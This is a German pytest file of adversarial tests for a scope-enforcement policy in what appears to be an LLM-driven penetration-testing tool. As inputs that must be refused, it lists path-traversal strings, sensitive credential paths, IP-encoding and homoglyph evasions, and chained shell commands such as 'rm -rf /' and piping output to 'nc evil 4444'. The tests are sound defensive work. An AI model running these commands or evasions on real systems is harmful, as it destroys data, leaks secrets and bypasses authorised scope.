"""Harte, adversariale Tests: Versuche, den Scope zu umgehen, und fiese Randfälle.

Der Anspruch: Ein Angreifer (oder ein fehlgeleitetes LLM) darf die
Scope-Durchsetzung mit keinem der hier durchgespielten Tricks aushebeln.
Alles, was nicht ausdrücklich erlaubt ist, muss verweigert werden (fail-closed).
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from specter.audit import AuditLog
from specter.config import Config, Engagement
from specter.findings import Finding, FindingsStore, Severity
from specter.safety import SafetyPolicy, ScopeViolation
from specter.state import EngagementState
from specter.tools.code_scan import CodeScanTool
from specter.tools.read_file import ReadFileTool
from specter.tools.run_command import RunCommandTool


def _cfg(tmp_path, **ov) -> Config:
    allowed = tmp_path / "targets"
    allowed.mkdir(exist_ok=True)
    d = dict(
        engagement=Engagement("X", "Y", "R"),
        allowed_targets=["127.0.0.1", "10.10.0.0/16"],
        forbidden_targets=["169.254.169.254"],
        allowed_paths=[allowed.resolve()],
        max_file_bytes=100_000, allowed_binaries=["curl", "nmap"],
        command_timeout=10, require_approval=False,
        max_iterations=5, model="claude-sonnet-5",
    )
    d.update(ov)
    return Config(**d)


def _policy(tmp_path, **ov) -> SafetyPolicy:
    return SafetyPolicy(_cfg(tmp_path, **ov))


# ========================= Datei-Scope-Ausbruch ===========================

def test_symlink_out_of_scope_denied(tmp_path):
    """Ein Symlink im Scope, der nach draußen zeigt, darf NICHT gelesen werden."""
    pol = _policy(tmp_path)
    outside = tmp_path / "geheim.txt"
    outside.write_text("TOP SECRET")
    link = tmp_path / "targets" / "harmlos.txt"
    try:
        os.symlink(outside, link)
    except (OSError, NotImplementedError):
        pytest.skip("Symlinks nicht unterstützt")
    with pytest.raises(ScopeViolation):
        pol.check_path(str(link))


def test_dotdot_traversal_denied(tmp_path):
    pol = _policy(tmp_path)
    for evil in ["../../etc/passwd", "targets/../../../etc/shadow",
                 "targets/./../../secret"]:
        with pytest.raises(ScopeViolation):
            pol.check_path(str(tmp_path / "targets" / evil))


def test_absolute_sensitive_paths_denied(tmp_path):
    pol = _policy(tmp_path)
    for p in ["/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa",
              "/proc/self/environ"]:
        with pytest.raises(ScopeViolation):
            pol.check_path(p)


def test_scope_root_itself_allowed(tmp_path):
    pol = _policy(tmp_path)
    assert pol.check_path(str(tmp_path / "targets")) == (tmp_path / "targets").resolve()


def test_sibling_prefix_not_confused(tmp_path):
    """'targets_evil' darf nicht als im Scope gelten, nur weil es mit 'targets' beginnt."""
    pol = _policy(tmp_path)
    sibling = tmp_path / "targets_evil"
    sibling.mkdir()
    (sibling / "x").write_text("y")
    with pytest.raises(ScopeViolation):
        pol.check_path(str(sibling / "x"))


# ========================= Netzwerk-Scope-Ausbruch ========================

def test_decimal_ip_evasion_denied(tmp_path):
    """2130706433 == 127.0.0.1 dezimal - darf NICHT als 127.0.0.1 durchgehen."""
    pol = _policy(tmp_path)
    with pytest.raises(ScopeViolation):
        pol.check_target("2130706433")


def test_octal_ip_evasion_denied(tmp_path):
    pol = _policy(tmp_path)
    with pytest.raises(ScopeViolation):
        pol.check_target("0177.0.0.1")


def test_all_zeros_denied(tmp_path):
    pol = _policy(tmp_path)
    with pytest.raises(ScopeViolation):
        pol.check_target("0.0.0.0")


def test_homoglyph_host_denied(tmp_path):
    """Kyrillisches Homoglyph darf nicht als erlaubter Host zählen."""
    pol = _policy(tmp_path, allowed_targets=["intern.example.de"])
    with pytest.raises(ScopeViolation):
        pol.check_target("intern.еxample.de")   # 'e' -> kyrillisch


def test_metadata_endpoint_forbidden_even_if_allowed(tmp_path):
    """Cloud-Metadata-Endpoint bleibt gesperrt, selbst wenn fälschlich erlaubt."""
    pol = _policy(tmp_path, allowed_targets=["169.254.169.254"],
                  forbidden_targets=["169.254.169.254"])
    with pytest.raises(ScopeViolation):
        pol.check_target("169.254.169.254")


def test_url_userinfo_does_not_bypass(tmp_path):
    """http://127.0.0.1@evil.com/ zielt real auf evil.com -> verweigert."""
    pol = _policy(tmp_path)
    with pytest.raises(ScopeViolation):
        pol.check_target("http://127.0.0.1@evil.com/")


def test_ipv6_bracketed_in_scope(tmp_path):
    pol = _policy(tmp_path, allowed_targets=["::1"])
    assert pol.check_target("[::1]:8080") == "::1"
    assert pol.check_target("http://[::1]:9000/") == "::1"


def test_ipv6_out_of_scope_denied(tmp_path):
    pol = _policy(tmp_path, allowed_targets=["::1"])
    with pytest.raises(ScopeViolation):
        pol.check_target("[2001:db8::1]")


def test_cidr_boundary(tmp_path):
    pol = _policy(tmp_path, allowed_targets=["10.10.0.0/16"])
    assert pol.check_target("10.10.255.254") == "10.10.255.254"
    with pytest.raises(ScopeViolation):
        pol.check_target("10.11.0.1")           # eine Stelle außerhalb


# ========================= Befehls-Injection ==============================

def test_command_chaining_variants_denied(tmp_path):
    pol = _policy(tmp_path)
    for evil in [
        "curl 127.0.0.1; rm -rf /",
        "curl 127.0.0.1 && curl 8.8.8.8",
        "curl 127.0.0.1 | nc evil 4444",
        "curl 127.0.0.1 `whoami`",
        "curl 127.0.0.1 $(id)",
        "curl 127.0.0.1 > /etc/passwd",
        "curl 127.0.0.1\nrm -rf /",
    ]:
        with pytest.raises(ScopeViolation):
            pol.check_command(evil)


def test_flag_with_embedded_out_of_scope_target_has_no_valid_target(tmp_path):
    """--url=http://8.8.8.8 ist ein Flag -> kein gültiges Ziel -> verweigert."""
    pol = _policy(tmp_path)
    with pytest.raises(ScopeViolation):
        pol.check_command("curl --url=http://8.8.8.8/")


def test_second_target_out_of_scope_denied(tmp_path):
    """Erstes Ziel im Scope, zweites nicht -> Gesamtbefehl verweigert."""
    pol = _policy(tmp_path)
    with pytest.raises(ScopeViolation):
        pol.check_command("curl 127.0.0.1 8.8.8.8")


def test_binary_via_absolute_path_still_checked(tmp_path):
    """Auch /usr/bin/curl wird gegen die Allowlist geprüft (Basename)."""
    pol = _policy(tmp_path, allowed_binaries=["curl"])
    argv = pol.check_command("/usr/bin/curl 127.0.0.1")
    assert argv[0] == "/usr/bin/curl"
    # Nicht erlaubtes Binary auch mit Pfad -> verweigert.
    with pytest.raises(ScopeViolation):
        pol.check_command("/bin/rm 127.0.0.1")


# ========================= Robustheit der Tools ===========================

def test_scan_binary_file_no_crash(tmp_path):
    cfg = _cfg(tmp_path)
    state = EngagementState()
    tool = CodeScanTool(cfg, SafetyPolicy(cfg), AuditLog(tmp_path / "a"), state)
    binf = (tmp_path / "targets" / "blob.bin")
    binf.write_bytes(bytes(range(256)) * 10)
    # .bin wird nicht gescannt (keine passende Endung) -> "keine Datei"
    r = tool.run({"path": str(tmp_path / "targets")})
    assert not r.is_error


def test_scan_empty_and_whitespace_files(tmp_path):
    cfg = _cfg(tmp_path)
    state = EngagementState()
    tool = CodeScanTool(cfg, SafetyPolicy(cfg), AuditLog(tmp_path / "a"), state)
    (tmp_path / "targets" / "leer.py").write_text("")
    (tmp_path / "targets" / "ws.py").write_text("\n\n   \n\t\n")
    r = tool.run({"path": str(tmp_path / "targets")})
    assert not r.is_error and len(state.findings) == 0


def test_scan_deeply_nested(tmp_path):
    cfg = _cfg(tmp_path)
    state = EngagementState()
    tool = CodeScanTool(cfg, SafetyPolicy(cfg), AuditLog(tmp_path / "a"), state)
    deep = tmp_path / "targets"
    for i in range(12):
        deep = deep / f"ebene{i}"
    deep.mkdir(parents=True)
    (deep / "tief.py").write_text('password = "GeheimTief1"')
    tool.run({"path": str(tmp_path / "targets")})
    assert len(state.findings) == 1


def test_read_file_unicode(tmp_path):
    cfg = _cfg(tmp_path)
    tool = ReadFileTool(cfg, SafetyPolicy(cfg), AuditLog(tmp_path / "a"))
    f = tmp_path / "targets" / "umlaut.py"
    f.write_text("# Grüße über Ölfässer mit €\nx = 1\n", encoding="utf-8")
    r = tool.run({"path": str(f)})
    assert not r.is_error and "Grüße" in r.content


def test_record_finding_missing_asset_is_error(tmp_path):
    state = EngagementState()
    from specter.tools.record_finding import RecordFindingTool
    tool = RecordFindingTool(state, AuditLog(tmp_path / "a"))
    r = tool.run({"title": "x", "category": "injection", "severity": "hoch"})
    assert r.is_error


def test_run_command_empty_output(tmp_path, monkeypatch):
    """Befehl ohne Ausgabe liefert trotzdem sauberen Exit-Code-Text."""
    import subprocess
    cfg = _cfg(tmp_path)
    tool = RunCommandTool(cfg, SafetyPolicy(cfg), AuditLog(tmp_path / "a"))

    class R:
        returncode = 0
        stdout = ""
        stderr = ""

    monkeypatch.setattr(subprocess, "run", lambda *a, **k: R())
    r = tool.run({"command": "curl 127.0.0.1"})
    assert "Exit-Code: 0" in r.content


def test_forbidden_cidr_blocks_range(tmp_path):
    """Ganze Netzbereiche lassen sich sperren."""
    pol = _policy(tmp_path, allowed_targets=["10.0.0.0/8"],
                  forbidden_targets=["10.0.5.0/24"])
    assert pol.check_target("10.0.4.1") == "10.0.4.1"
    with pytest.raises(ScopeViolation):
        pol.check_target("10.0.5.99")


def test_many_findings_dedup_stable(tmp_path):
    """Dieselbe Schwachstelle 100x erfasst bleibt genau ein Finding."""
    store = FindingsStore()
    for _ in range(100):
        store.add(Finding("SQLi", "injection", Severity.HOCH, "api", location="a.py:9"))
    assert len(store) == 1
